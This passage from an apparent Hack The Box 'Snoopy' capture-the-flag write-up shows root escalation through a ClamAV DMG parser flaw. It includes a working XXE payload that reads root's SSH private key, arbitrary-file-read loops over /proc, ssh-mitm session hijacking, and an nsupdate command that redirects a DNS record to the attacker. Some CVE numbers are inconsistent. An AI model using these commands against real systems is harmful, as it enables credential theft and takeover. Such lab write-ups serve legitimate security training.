    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User sbrown may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
```


### Abuse DMG file parser of clamAV (CVE-2023-20032)

The version on target is vulnerable

```bash
sbrown@snoopy:~$ clamscan --version
ClamAV 1.0.0/26853/Fri Mar 24 07:24:11 2023
```

Google : `ClamAV 1.0.0 cve`

Found 2 CVEs : `CVE-2023-20052`, `CVE-2023-20032`

> https://www.tenable.com/plugins/nessus/172281

![](/assets/obsidian/008075e7d45e4bc42d57021fcc3d24ce.png)

Can't find public exploit for `CVE-2023-20052`

Try `CVE-2023-20032` instead

Google : `CVE-2023-25002 github`

> https://github.com/nokn0wthing/CVE-2023-20052

```bash
git clone https://github.com/nokn0wthing/CVE-2023-20052.git
cd CVE-2023-20052
sudo docker build -t cve-2023-20052 .
sudo docker run -v $(pwd):/exploit -it cve-2023-20052 bash

genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img . && dmg dmg test.img test.dmg
bbe -e 's|<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">|<!DOCTYPE plist [<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa"> ]>|' -e 's/blkx/&xxe\;/' test.dmg -o exploit.dmg
```

It took some time to setup the docker container

![](/assets/obsidian/7606435dd11b53d5f4220f452309ed5a.png)

Now, upload `exploit.dng`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy/exploit/CVE-2023-20052]
└─$ scp exploit.dmg sbrown@snoopy.htb:/home/sbrown/scanfiles/
exploit.dmg     
```

Run exploit

```bash
sbrown@snoopy:~$ sudo clamscan --debug /home/sbrown/scanfiles/exploit.dmg
LibClamAV debug: searching for unrar, user-searchpath: /usr/local/lib
LibClamAV debug: unrar support loaded from /usr/local/lib/libclamunrar_iface.so.11.0.0
LibClamAV debug: Initialized 1.0.0 engine
LibClamAV debug: Initializing phishcheck module
LibClamAV debug: Phishcheck: Compiling regex: ^ *(http|https|ftp:(//)?)?[0-9]{1,3}(\.[0-9]{1,3}){3}[/?:]? *$
LibClamAV debug: Phishcheck module initialized
LibClamAV debug: Bytecode initialized in interpreter mode
LibClamAV debug: Loading databases from /usr/local/share/clamav
LibClamAV debug: in cli_cvdload()
LibClamAV debug: MD5(.tar.gz) = 9329f8df2b9928baea0ee2cfebb8baab
LibClamAV debug: cli_versig: Decoded signature: 9329f8df2b9928baea0ee2cfebb8baab
LibClamAV debug: cli_versig: Digital signature is correct.
...
```

Got the root's ssh private key

![](/assets/obsidian/2855a8428885ce50685071b7d5964821.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy/exploit/CVE-2023-20052]
└─$ vi root.id_rsa

┌──(bravosec㉿fsociety)-[~/htb/Snoopy/exploit/CVE-2023-20052]
└─$ chmod 600 root.id_rsa

┌──(bravosec㉿fsociety)-[~/htb/Snoopy/exploit/CVE-2023-20052]
└─$ ssh -i root.id_rsa root@snoopy.htb
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri May 12 21:28:56 2023 from 10.10.14.46
root@snoopy:~# id
cauid=0(root) gid=0(root) groups=0(root)
root@snoopy:~# cat root.txt
9e0b20845f063dfd2d677e0cce412877
```

# Additional
---

## SSH-Mitm

> https://github.com/ssh-mitm/ssh-mitm

- It provides more functions such as `audit clients against known vulnerabilities`, `publickey authentication`, `hijacking and logging of terminal sessions` ...etc

```bash
pipx install ssh-mitm
```

```bash
sudo $(which ssh-mitm) server --transparent --listen-port 2222
```

![](/assets/obsidian/e4185d1fa90f2edce2beabab22f8df15.png)

![](/assets/obsidian/35a277c8e2cd981b6c81467806374d03.png)

## Easter Egg

I was playing on a VIP+ server, so it wasn't sent by other players...

![](/assets/obsidian/b4def285c9a1c44e1041f7532554447d.png)

Lets trick him xD

![](/assets/obsidian/c23a690f123ad2f03e1c39eb528286fd.png)

## Notes

- DNS with `tcp` enabled means it allow zone transfer

## Enumerate /proc/ via arbitrary file read 

### Enumerate processes

```bash
for i in $(seq 0 100); do ./download.sh /proc/$1/cmdline; done
```

### Get files under current directory

```bash
./download.sh /proc/self/cwd/index.html
./download.sh /proc/self/cwd/download.php
```


## Check nginx config

```bash
./download.sh /etc/nginx/sites-enabled/default
```

## Download php files from feroxbuster result

```bash
┌──(bravosec㉿fsociety)-[~/htb/Snoopy]
└─$ cat ferox_80.txt|awk '{print $6}'|unfurl paths
/assets/img/favicon.png
/assets/vendor/php-email-form/validate.js
/contact.html
/assets/img/apple-touch-icon.png
/assets/js/main.js
...
```

```bash
for p in $(cat ferox_80.txt|awk '{print $6}'|unfurl paths); do ./download.sh "/proc/self/cwd${p}"; done
```


## Nsupdate load records from file

> rndc-key

```
key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

> dns_mail.txt

```
server snoopy.htb
update add mail.snoopy.htb. 77777 IN A 10.10.16.10
send
```

Command : 

```bash
nsupdate -k rndc-key dns_mail.txt
```




